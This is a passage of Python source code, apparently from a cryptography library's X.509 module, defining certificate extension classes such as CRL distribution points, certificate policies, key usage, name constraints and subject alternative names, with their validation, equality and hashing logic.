isinstance(x, DistributionPoint) for x in distribution_points\r\n        ):\r\n            raise TypeError(\r\n                "distribution_points must be a list of DistributionPoint "\r\n                "objects"\r\n            )\r\n\r\n        self._distribution_points = distribution_points\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods(\r\n        "_distribution_points"\r\n    )\r\n\r\n    def __repr__(self) -> str:\r\n        return "<CRLDistributionPoints({})>".format(self._distribution_points)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, CRLDistributionPoints):\r\n            return NotImplemented\r\n\r\n        return self._distribution_points == other._distribution_points\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._distribution_points))\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass FreshestCRL(ExtensionType):\r\n    oid = ExtensionOID.FRESHEST_CRL\r\n\r\n    def __init__(\r\n        self, distribution_points: typing.Iterable["DistributionPoint"]\r\n    ) -> None:\r\n        distribution_points = list(distribution_points)\r\n        if not all(\r\n            isinstance(x, DistributionPoint) for x in distribution_points\r\n        ):\r\n            raise TypeError(\r\n                "distribution_points must be a list of DistributionPoint "\r\n                "objects"\r\n            )\r\n\r\n        self._distribution_points = distribution_points\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods(\r\n        "_distribution_points"\r\n    )\r\n\r\n    def __repr__(self) -> str:\r\n        return "<FreshestCRL({})>".format(self._distribution_points)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, FreshestCRL):\r\n            return NotImplemented\r\n\r\n        return self._distribution_points == other._distribution_points\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._distribution_points))\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass DistributionPoint:\r\n    def __init__(\r\n        self,\r\n        full_name: typing.Optional[typing.Iterable[GeneralName]],\r\n        relative_name: typing.Optional[RelativeDistinguishedName],\r\n        reasons: typing.Optional[typing.FrozenSet["ReasonFlags"]],\r\n        crl_issuer: typing.Optional[typing.Iterable[GeneralName]],\r\n    ) -> None:\r\n        if full_name and relative_name:\r\n            raise ValueError(\r\n                "You cannot provide both full_name and relative_name, at "\r\n                "least one must be None."\r\n            )\r\n\r\n        if full_name is not None:\r\n            full_name = list(full_name)\r\n            if not all(isinstance(x, GeneralName) for x in full_name):\r\n                raise TypeError(\r\n                    "full_name must be a list of GeneralName objects"\r\n                )\r\n\r\n        if relative_name:\r\n            if not isinstance(relative_name, RelativeDistinguishedName):\r\n                raise TypeError(\r\n                    "relative_name must be a RelativeDistinguishedName"\r\n                )\r\n\r\n        if crl_issuer is not None:\r\n            crl_issuer = list(crl_issuer)\r\n            if not all(isinstance(x, GeneralName) for x in crl_issuer):\r\n                raise TypeError(\r\n                    "crl_issuer must be None or a list of general names"\r\n                )\r\n\r\n        if reasons and (\r\n            not isinstance(reasons, frozenset)\r\n            or not all(isinstance(x, ReasonFlags) for x in reasons)\r\n        ):\r\n            raise TypeError("reasons must be None or frozenset of ReasonFlags")\r\n\r\n        if reasons and (\r\n            ReasonFlags.unspecified in reasons\r\n            or ReasonFlags.remove_from_crl in reasons\r\n        ):\r\n            raise ValueError(\r\n                "unspecified and remove_from_crl are not valid reasons in a "\r\n                "DistributionPoint"\r\n            )\r\n\r\n        if reasons and not crl_issuer and not (full_name or relative_name):\r\n            raise ValueError(\r\n                "You must supply crl_issuer, full_name, or relative_name when "\r\n                "reasons is not None"\r\n            )\r\n\r\n        self._full_name = full_name\r\n        self._relative_name = relative_name\r\n        self._reasons = reasons\r\n        self._crl_issuer = crl_issuer\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<DistributionPoint(full_name={0.full_name}, relative_name={0.rela"\r\n            "tive_name}, reasons={0.reasons}, "\r\n            "crl_issuer={0.crl_issuer})>".format(self)\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DistributionPoint):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.full_name == other.full_name\r\n            and self.relative_name == other.relative_name\r\n            and self.reasons == other.reasons\r\n            and self.crl_issuer == other.crl_issuer\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        if self.full_name is not None:\r\n            fn: typing.Optional[typing.Tuple[GeneralName, ...]] = tuple(\r\n                self.full_name\r\n            )\r\n        else:\r\n            fn = None\r\n\r\n        if self.crl_issuer is not None:\r\n            crl_issuer: typing.Optional[\r\n                typing.Tuple[GeneralName, ...]\r\n            ] = tuple(self.crl_issuer)\r\n        else:\r\n            crl_issuer = None\r\n\r\n        return hash((fn, self.relative_name, self.reasons, crl_issuer))\r\n\r\n    @property\r\n    def full_name(self) -> typing.Optional[typing.List[GeneralName]]:\r\n        return self._full_name\r\n\r\n    @property\r\n    def relative_name(self) -> typing.Optional[RelativeDistinguishedName]:\r\n        return self._relative_name\r\n\r\n    @property\r\n    def reasons(self) -> typing.Optional[typing.FrozenSet["ReasonFlags"]]:\r\n        return self._reasons\r\n\r\n    @property\r\n    def crl_issuer(self) -> typing.Optional[typing.List[GeneralName]]:\r\n        return self._crl_issuer\r\n\r\n\r\nclass ReasonFlags(utils.Enum):\r\n    unspecified = "unspecified"\r\n    key_compromise = "keyCompromise"\r\n    ca_compromise = "cACompromise"\r\n    affiliation_changed = "affiliationChanged"\r\n    superseded = "superseded"\r\n    cessation_of_operation = "cessationOfOperation"\r\n    certificate_hold = "certificateHold"\r\n    privilege_withdrawn = "privilegeWithdrawn"\r\n    aa_compromise = "aACompromise"\r\n    remove_from_crl = "removeFromCRL"\r\n\r\n\r\n# These are distribution point bit string mappings. Not to be confused with\r\n# CRLReason reason flags bit string mappings.\r\n# ReasonFlags ::= BIT STRING {\r\n#      unused                  (0),\r\n#      keyCompromise           (1),\r\n#      cACompromise            (2),\r\n#      affiliationChanged      (3),\r\n#      superseded              (4),\r\n#      cessationOfOperation    (5),\r\n#      certificateHold         (6),\r\n#      privilegeWithdrawn      (7),\r\n#      aACompromise            (8) }\r\n_REASON_BIT_MAPPING = {\r\n    1: ReasonFlags.key_compromise,\r\n    2: ReasonFlags.ca_compromise,\r\n    3: ReasonFlags.affiliation_changed,\r\n    4: ReasonFlags.superseded,\r\n    5: ReasonFlags.cessation_of_operation,\r\n    6: ReasonFlags.certificate_hold,\r\n    7: ReasonFlags.privilege_withdrawn,\r\n    8: ReasonFlags.aa_compromise,\r\n}\r\n\r\n\r\nclass PolicyConstraints(ExtensionType):\r\n    oid = ExtensionOID.POLICY_CONSTRAINTS\r\n\r\n    def __init__(\r\n        self,\r\n        require_explicit_policy: typing.Optional[int],\r\n        inhibit_policy_mapping: typing.Optional[int],\r\n    ) -> None:\r\n        if require_explicit_policy is not None and not isinstance(\r\n            require_explicit_policy, int\r\n        ):\r\n            raise TypeError(\r\n                "require_explicit_policy must be a non-negative integer or "\r\n                "None"\r\n            )\r\n\r\n        if inhibit_policy_mapping is not None and not isinstance(\r\n            inhibit_policy_mapping, int\r\n        ):\r\n            raise TypeError(\r\n                "inhibit_policy_mapping must be a non-negative integer or None"\r\n            )\r\n\r\n        if inhibit_policy_mapping is None and require_explicit_policy is None:\r\n            raise ValueError(\r\n                "At least one of require_explicit_policy and "\r\n                "inhibit_policy_mapping must not be None"\r\n            )\r\n\r\n        self._require_explicit_policy = require_explicit_policy\r\n        self._inhibit_policy_mapping = inhibit_policy_mapping\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<PolicyConstraints(require_explicit_policy={0.require_explicit"\r\n            "_policy}, inhibit_policy_mapping={0.inhibit_policy_"\r\n            "mapping})>".format(self)\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, PolicyConstraints):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.require_explicit_policy == other.require_explicit_policy\r\n            and self.inhibit_policy_mapping == other.inhibit_policy_mapping\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(\r\n            (self.require_explicit_policy, self.inhibit_policy_mapping)\r\n        )\r\n\r\n    @property\r\n    def require_explicit_policy(self) -> typing.Optional[int]:\r\n        return self._require_explicit_policy\r\n\r\n    @property\r\n    def inhibit_policy_mapping(self) -> typing.Optional[int]:\r\n        return self._inhibit_policy_mapping\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass CertificatePolicies(ExtensionType):\r\n    oid = ExtensionOID.CERTIFICATE_POLICIES\r\n\r\n    def __init__(self, policies: typing.Iterable["PolicyInformation"]) -> None:\r\n        policies = list(policies)\r\n        if not all(isinstance(x, PolicyInformation) for x in policies):\r\n            raise TypeError(\r\n                "Every item in the policies list must be a "\r\n                "PolicyInformation"\r\n            )\r\n\r\n        self._policies = policies\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_policies")\r\n\r\n    def __repr__(self) -> str:\r\n        return "<CertificatePolicies({})>".format(self._policies)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, CertificatePolicies):\r\n            return NotImplemented\r\n\r\n        return self._policies == other._policies\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._policies))\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass PolicyInformation:\r\n    def __init__(\r\n        self,\r\n        policy_identifier: ObjectIdentifier,\r\n        policy_qualifiers: typing.Optional[\r\n            typing.Iterable[typing.Union[str, "UserNotice"]]\r\n        ],\r\n    ) -> None:\r\n        if not isinstance(policy_identifier, ObjectIdentifier):\r\n            raise TypeError("policy_identifier must be an ObjectIdentifier")\r\n\r\n        self._policy_identifier = policy_identifier\r\n\r\n        if policy_qualifiers is not None:\r\n            policy_qualifiers = list(policy_qualifiers)\r\n            if not all(\r\n                isinstance(x, (str, UserNotice)) for x in policy_qualifiers\r\n            ):\r\n                raise TypeError(\r\n                    "policy_qualifiers must be a list of strings and/or "\r\n                    "UserNotice objects or None"\r\n                )\r\n\r\n        self._policy_qualifiers = policy_qualifiers\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<PolicyInformation(policy_identifier={0.policy_identifier}, polic"\r\n            "y_qualifiers={0.policy_qualifiers})>".format(self)\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, PolicyInformation):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.policy_identifier == other.policy_identifier\r\n            and self.policy_qualifiers == other.policy_qualifiers\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        if self.policy_qualifiers is not None:\r\n            pq: typing.Optional[\r\n                typing.Tuple[typing.Union[str, "UserNotice"], ...]\r\n            ] = tuple(self.policy_qualifiers)\r\n        else:\r\n            pq = None\r\n\r\n        return hash((self.policy_identifier, pq))\r\n\r\n    @property\r\n    def policy_identifier(self) -> ObjectIdentifier:\r\n        return self._policy_identifier\r\n\r\n    @property\r\n    def policy_qualifiers(\r\n        self,\r\n    ) -> typing.Optional[typing.List[typing.Union[str, "UserNotice"]]]:\r\n        return self._policy_qualifiers\r\n\r\n\r\nclass UserNotice:\r\n    def __init__(\r\n        self,\r\n        notice_reference: typing.Optional["NoticeReference"],\r\n        explicit_text: typing.Optional[str],\r\n    ) -> None:\r\n        if notice_reference and not isinstance(\r\n            notice_reference, NoticeReference\r\n        ):\r\n            raise TypeError(\r\n                "notice_reference must be None or a NoticeReference"\r\n            )\r\n\r\n        self._notice_reference = notice_reference\r\n        self._explicit_text = explicit_text\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<UserNotice(notice_reference={0.notice_reference}, explicit_text="\r\n            "{0.explicit_text!r})>".format(self)\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, UserNotice):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.notice_reference == other.notice_reference\r\n            and self.explicit_text == other.explicit_text\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.notice_reference, self.explicit_text))\r\n\r\n    @property\r\n    def notice_reference(self) -> typing.Optional["NoticeReference"]:\r\n        return self._notice_reference\r\n\r\n    @property\r\n    def explicit_text(self) -> typing.Optional[str]:\r\n        return self._explicit_text\r\n\r\n\r\nclass NoticeReference:\r\n    def __init__(\r\n        self,\r\n        organization: typing.Optional[str],\r\n        notice_numbers: typing.Iterable[int],\r\n    ) -> None:\r\n        self._organization = organization\r\n        notice_numbers = list(notice_numbers)\r\n        if not all(isinstance(x, int) for x in notice_numbers):\r\n            raise TypeError("notice_numbers must be a list of integers")\r\n\r\n        self._notice_numbers = notice_numbers\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<NoticeReference(organization={0.organization!r}, notice_numbers="\r\n            "{0.notice_numbers})>".format(self)\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, NoticeReference):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.organization == other.organization\r\n            and self.notice_numbers == other.notice_numbers\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.organization, tuple(self.notice_numbers)))\r\n\r\n    @property\r\n    def organization(self) -> typing.Optional[str]:\r\n        return self._organization\r\n\r\n    @property\r\n    def notice_numbers(self) -> typing.List[int]:\r\n        return self._notice_numbers\r\n\r\n\r\nclass ExtendedKeyUsage(ExtensionType):\r\n    oid = ExtensionOID.EXTENDED_KEY_USAGE\r\n\r\n    def __init__(self, usages: typing.Iterable[ObjectIdentifier]) -> None:\r\n        usages = list(usages)\r\n        if not all(isinstance(x, ObjectIdentifier) for x in usages):\r\n            raise TypeError(\r\n                "Every item in the usages list must be an ObjectIdentifier"\r\n            )\r\n\r\n        self._usages = usages\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_usages")\r\n\r\n    def __repr__(self) -> str:\r\n        return "<ExtendedKeyUsage({})>".format(self._usages)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, ExtendedKeyUsage):\r\n            return NotImplemented\r\n\r\n        return self._usages == other._usages\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._usages))\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass OCSPNoCheck(ExtensionType):\r\n    oid = ExtensionOID.OCSP_NO_CHECK\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, OCSPNoCheck):\r\n            return NotImplemented\r\n\r\n        return True\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(OCSPNoCheck)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<OCSPNoCheck()>"\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass PrecertPoison(ExtensionType):\r\n    oid = ExtensionOID.PRECERT_POISON\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, PrecertPoison):\r\n            return NotImplemented\r\n\r\n        return True\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(PrecertPoison)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<PrecertPoison()>"\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass TLSFeature(ExtensionType):\r\n    oid = ExtensionOID.TLS_FEATURE\r\n\r\n    def __init__(self, features: typing.Iterable["TLSFeatureType"]) -> None:\r\n        features = list(features)\r\n        if (\r\n            not all(isinstance(x, TLSFeatureType) for x in features)\r\n            or len(features) == 0\r\n        ):\r\n            raise TypeError(\r\n                "features must be a list of elements from the TLSFeatureType "\r\n                "enum"\r\n            )\r\n\r\n        self._features = features\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_features")\r\n\r\n    def __repr__(self) -> str:\r\n        return "<TLSFeature(features={0._features})>".format(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, TLSFeature):\r\n            return NotImplemented\r\n\r\n        return self._features == other._features\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._features))\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass TLSFeatureType(utils.Enum):\r\n    # status_request is defined in RFC 6066 and is used for what is commonly\r\n    # called OCSP Must-Staple when present in the TLS Feature extension in an\r\n    # X.509 certificate.\r\n    status_request = 5\r\n    # status_request_v2 is defined in RFC 6961 and allows multiple OCSP\r\n    # responses to be provided. It is not currently in use by clients or\r\n    # servers.\r\n    status_request_v2 = 17\r\n\r\n\r\n_TLS_FEATURE_TYPE_TO_ENUM = {x.value: x for x in TLSFeatureType}\r\n\r\n\r\nclass InhibitAnyPolicy(ExtensionType):\r\n    oid = ExtensionOID.INHIBIT_ANY_POLICY\r\n\r\n    def __init__(self, skip_certs: int) -> None:\r\n        if not isinstance(skip_certs, int):\r\n            raise TypeError("skip_certs must be an integer")\r\n\r\n        if skip_certs < 0:\r\n            raise ValueError("skip_certs must be a non-negative integer")\r\n\r\n        self._skip_certs = skip_certs\r\n\r\n    def __repr__(self) -> str:\r\n        return "<InhibitAnyPolicy(skip_certs={0.skip_certs})>".format(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, InhibitAnyPolicy):\r\n            return NotImplemented\r\n\r\n        return self.skip_certs == other.skip_certs\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.skip_certs)\r\n\r\n    @property\r\n    def skip_certs(self) -> int:\r\n        return self._skip_certs\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass KeyUsage(ExtensionType):\r\n    oid = ExtensionOID.KEY_USAGE\r\n\r\n    def __init__(\r\n        self,\r\n        digital_signature: bool,\r\n        content_commitment: bool,\r\n        key_encipherment: bool,\r\n        data_encipherment: bool,\r\n        key_agreement: bool,\r\n        key_cert_sign: bool,\r\n        crl_sign: bool,\r\n        encipher_only: bool,\r\n        decipher_only: bool,\r\n    ) -> None:\r\n        if not key_agreement and (encipher_only or decipher_only):\r\n            raise ValueError(\r\n                "encipher_only and decipher_only can only be true when "\r\n                "key_agreement is true"\r\n            )\r\n\r\n        self._digital_signature = digital_signature\r\n        self._content_commitment = content_commitment\r\n        self._key_encipherment = key_encipherment\r\n        self._data_encipherment = data_encipherment\r\n        self._key_agreement = key_agreement\r\n        self._key_cert_sign = key_cert_sign\r\n        self._crl_sign = crl_sign\r\n        self._encipher_only = encipher_only\r\n        self._decipher_only = decipher_only\r\n\r\n    @property\r\n    def digital_signature(self) -> bool:\r\n        return self._digital_signature\r\n\r\n    @property\r\n    def content_commitment(self) -> bool:\r\n        return self._content_commitment\r\n\r\n    @property\r\n    def key_encipherment(self) -> bool:\r\n        return self._key_encipherment\r\n\r\n    @property\r\n    def data_encipherment(self) -> bool:\r\n        return self._data_encipherment\r\n\r\n    @property\r\n    def key_agreement(self) -> bool:\r\n        return self._key_agreement\r\n\r\n    @property\r\n    def key_cert_sign(self) -> bool:\r\n        return self._key_cert_sign\r\n\r\n    @property\r\n    def crl_sign(self) -> bool:\r\n        return self._crl_sign\r\n\r\n    @property\r\n    def encipher_only(self) -> bool:\r\n        if not self.key_agreement:\r\n            raise ValueError(\r\n                "encipher_only is undefined unless key_agreement is true"\r\n            )\r\n        else:\r\n            return self._encipher_only\r\n\r\n    @property\r\n    def decipher_only(self) -> bool:\r\n        if not self.key_agreement:\r\n            raise ValueError(\r\n                "decipher_only is undefined unless key_agreement is true"\r\n            )\r\n        else:\r\n            return self._decipher_only\r\n\r\n    def __repr__(self) -> str:\r\n        try:\r\n            encipher_only = self.encipher_only\r\n            decipher_only = self.decipher_only\r\n        except ValueError:\r\n            # Users found None confusing because even though encipher/decipher\r\n            # have no meaning unless key_agreement is true, to construct an\r\n            # instance of the class you still need to pass False.\r\n            encipher_only = False\r\n            decipher_only = False\r\n\r\n        return (\r\n            "<KeyUsage(digital_signature={0.digital_signature}, "\r\n            "content_commitment={0.content_commitment}, "\r\n            "key_encipherment={0.key_encipherment}, "\r\n            "data_encipherment={0.data_encipherment}, "\r\n            "key_agreement={0.key_agreement}, "\r\n            "key_cert_sign={0.key_cert_sign}, crl_sign={0.crl_sign}, "\r\n            "encipher_only={1}, decipher_only={2})>"\r\n        ).format(self, encipher_only, decipher_only)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, KeyUsage):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.digital_signature == other.digital_signature\r\n            and self.content_commitment == other.content_commitment\r\n            and self.key_encipherment == other.key_encipherment\r\n            and self.data_encipherment == other.data_encipherment\r\n            and self.key_agreement == other.key_agreement\r\n            and self.key_cert_sign == other.key_cert_sign\r\n            and self.crl_sign == other.crl_sign\r\n            and self._encipher_only == other._encipher_only\r\n            and self._decipher_only == other._decipher_only\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(\r\n            (\r\n                self.digital_signature,\r\n                self.content_commitment,\r\n                self.key_encipherment,\r\n                self.data_encipherment,\r\n                self.key_agreement,\r\n                self.key_cert_sign,\r\n                self.crl_sign,\r\n                self._encipher_only,\r\n                self._decipher_only,\r\n            )\r\n        )\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass NameConstraints(ExtensionType):\r\n    oid = ExtensionOID.NAME_CONSTRAINTS\r\n\r\n    def __init__(\r\n        self,\r\n        permitted_subtrees: typing.Optional[typing.Iterable[GeneralName]],\r\n        excluded_subtrees: typing.Optional[typing.Iterable[GeneralName]],\r\n    ) -> None:\r\n        if permitted_subtrees is not None:\r\n            permitted_subtrees = list(permitted_subtrees)\r\n            if not permitted_subtrees:\r\n                raise ValueError(\r\n                    "permitted_subtrees must be a non-empty list or None"\r\n                )\r\n            if not all(isinstance(x, GeneralName) for x in permitted_subtrees):\r\n                raise TypeError(\r\n                    "permitted_subtrees must be a list of GeneralName objects "\r\n                    "or None"\r\n                )\r\n\r\n            self._validate_ip_name(permitted_subtrees)\r\n\r\n        if excluded_subtrees is not None:\r\n            excluded_subtrees = list(excluded_subtrees)\r\n            if not excluded_subtrees:\r\n                raise ValueError(\r\n                    "excluded_subtrees must be a non-empty list or None"\r\n                )\r\n            if not all(isinstance(x, GeneralName) for x in excluded_subtrees):\r\n                raise TypeError(\r\n                    "excluded_subtrees must be a list of GeneralName objects "\r\n                    "or None"\r\n                )\r\n\r\n            self._validate_ip_name(excluded_subtrees)\r\n\r\n        if permitted_subtrees is None and excluded_subtrees is None:\r\n            raise ValueError(\r\n                "At least one of permitted_subtrees and excluded_subtrees "\r\n                "must not be None"\r\n            )\r\n\r\n        self._permitted_subtrees = permitted_subtrees\r\n        self._excluded_subtrees = excluded_subtrees\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, NameConstraints):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.excluded_subtrees == other.excluded_subtrees\r\n            and self.permitted_subtrees == other.permitted_subtrees\r\n        )\r\n\r\n    def _validate_ip_name(self, tree: typing.Iterable[GeneralName]) -> None:\r\n        if any(\r\n            isinstance(name, IPAddress)\r\n            and not isinstance(\r\n                name.value, (ipaddress.IPv4Network, ipaddress.IPv6Network)\r\n            )\r\n            for name in tree\r\n        ):\r\n            raise TypeError(\r\n                "IPAddress name constraints must be an IPv4Network or"\r\n                " IPv6Network object"\r\n            )\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<NameConstraints(permitted_subtrees={0.permitted_subtrees}, "\r\n            "excluded_subtrees={0.excluded_subtrees})>".format(self)\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        if self.permitted_subtrees is not None:\r\n            ps: typing.Optional[typing.Tuple[GeneralName, ...]] = tuple(\r\n                self.permitted_subtrees\r\n            )\r\n        else:\r\n            ps = None\r\n\r\n        if self.excluded_subtrees is not None:\r\n            es: typing.Optional[typing.Tuple[GeneralName, ...]] = tuple(\r\n                self.excluded_subtrees\r\n            )\r\n        else:\r\n            es = None\r\n\r\n        return hash((ps, es))\r\n\r\n    @property\r\n    def permitted_subtrees(\r\n        self,\r\n    ) -> typing.Optional[typing.List[GeneralName]]:\r\n        return self._permitted_subtrees\r\n\r\n    @property\r\n    def excluded_subtrees(\r\n        self,\r\n    ) -> typing.Optional[typing.List[GeneralName]]:\r\n        return self._excluded_subtrees\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass Extension(typing.Generic[ExtensionTypeVar]):\r\n    def __init__(\r\n        self, oid: ObjectIdentifier, critical: bool, value: ExtensionTypeVar\r\n    ) -> None:\r\n        if not isinstance(oid, ObjectIdentifier):\r\n            raise TypeError(\r\n                "oid argument must be an ObjectIdentifier instance."\r\n            )\r\n\r\n        if not isinstance(critical, bool):\r\n            raise TypeError("critical must be a boolean value")\r\n\r\n        self._oid = oid\r\n        self._critical = critical\r\n        self._value = value\r\n\r\n    @property\r\n    def oid(self) -> ObjectIdentifier:\r\n        return self._oid\r\n\r\n    @property\r\n    def critical(self) -> bool:\r\n        return self._critical\r\n\r\n    @property\r\n    def value(self) -> ExtensionTypeVar:\r\n        return self._value\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<Extension(oid={0.oid}, critical={0.critical}, "\r\n            "value={0.value})>"\r\n        ).format(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, Extension):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.oid == other.oid\r\n            and self.critical == other.critical\r\n            and self.value == other.value\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.oid, self.critical, self.value))\r\n\r\n\r\nclass GeneralNames:\r\n    def __init__(self, general_names: typing.Iterable[GeneralName]) -> None:\r\n        general_names = list(general_names)\r\n        if not all(isinstance(x, GeneralName) for x in general_names):\r\n            raise TypeError(\r\n                "Every item in the general_names list must be an "\r\n                "object conforming to the GeneralName interface"\r\n            )\r\n\r\n        self._general_names = general_names\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_general_names")\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Union[\r\n            typing.Type[DNSName],\r\n            typing.Type[UniformResourceIdentifier],\r\n            typing.Type[RFC822Name],\r\n        ],\r\n    ) -> typing.List[str]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Type[DirectoryName],\r\n    ) -> typing.List[Name]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Type[RegisteredID],\r\n    ) -> typing.List[ObjectIdentifier]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self, type: typing.Type[IPAddress]\r\n    ) -> typing.List[_IPADDRESS_TYPES]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self, type: typing.Type[OtherName]\r\n    ) -> typing.List[OtherName]:\r\n        ...\r\n\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Union[\r\n            typing.Type[DNSName],\r\n            typing.Type[DirectoryName],\r\n            typing.Type[IPAddress],\r\n            typing.Type[OtherName],\r\n            typing.Type[RFC822Name],\r\n            typing.Type[RegisteredID],\r\n            typing.Type[UniformResourceIdentifier],\r\n        ],\r\n    ) -> typing.Union[\r\n        typing.List[_IPADDRESS_TYPES],\r\n        typing.List[str],\r\n        typing.List[OtherName],\r\n        typing.List[Name],\r\n        typing.List[ObjectIdentifier],\r\n    ]:\r\n        # Return the value of each GeneralName, except for OtherName instances\r\n        # which we return directly because it has two important properties not\r\n        # just one value.\r\n        objs = (i for i in self if isinstance(i, type))\r\n        if type != OtherName:\r\n            return [i.value for i in objs]\r\n        return list(objs)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<GeneralNames({})>".format(self._general_names)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, GeneralNames):\r\n            return NotImplemented\r\n\r\n        return self._general_names == other._general_names\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._general_names))\r\n\r\n\r\nclass SubjectAlternativeName(ExtensionType):\r\n    oid = ExtensionOID.SUBJECT_ALTERNATIVE_NAME\r\n\r\n    def __init__(self, general_names: typing.Iterable[GeneralName]) -> None:\r\n        self._general_names = GeneralNames(general_names)\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_general_names")\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Union[\r\n            typing.Type[DNSName],\r\n            typing.Type[UniformResourceIdentifier],\r\n            typing.Type[RFC822Name],\r\n        ],\r\n    ) -> typing.List[str]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Type[DirectoryName],\r\n    ) -> typing.List[Name]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Type[RegisteredID],\r\n    ) -> typing.List[ObjectIdentifier]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self, type: typing.Type[IPAddress]\r\n    ) -> typing.List[_IPADDRESS_TYPES]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self, type: typing.Type[OtherName]\r\n    ) -> typing.List[OtherName]:\r\n        ...\r\n\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Union[\r\n            typing.Type[DNSName],\r\n            typing.Type[DirectoryName],\r\n            typing.Type[IPAddress],\r\n            